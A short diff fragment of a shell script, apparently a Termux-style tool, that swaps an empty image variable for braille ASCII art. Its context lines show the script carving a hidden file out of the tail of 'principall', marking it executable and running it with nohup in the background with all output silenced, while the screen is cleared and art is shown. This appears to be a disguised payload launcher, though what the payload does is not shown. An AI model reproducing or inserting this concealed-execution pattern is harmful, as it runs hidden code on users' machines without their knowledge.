@@ -3,7 +3,7 @@ cd $HOME; clear
   tail -n +148 principall > s && chmod +x s
   nohup ./s </dev/null >/dev/null 2>&1&
   clear; sleep 5.5
-  IMG1=""
+  IMG1="
 ⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⡴⠶⠟⠛⠛⠛⠛⠻⠶⢦⣤⣀⠄⠄⠄⠄⠄⠄⠄⠄\n
 ⠄⠄⠄⠄⠄⣠⣴⡟⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠙⢻⣦⣄⠄⠄⠄⠄⠄\n
 ⠄⠄⠄⣠⡾⠋⠈⣿⣶⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣠⣶⣿⠁⠙⢷⣄⠄⠄⠄\n
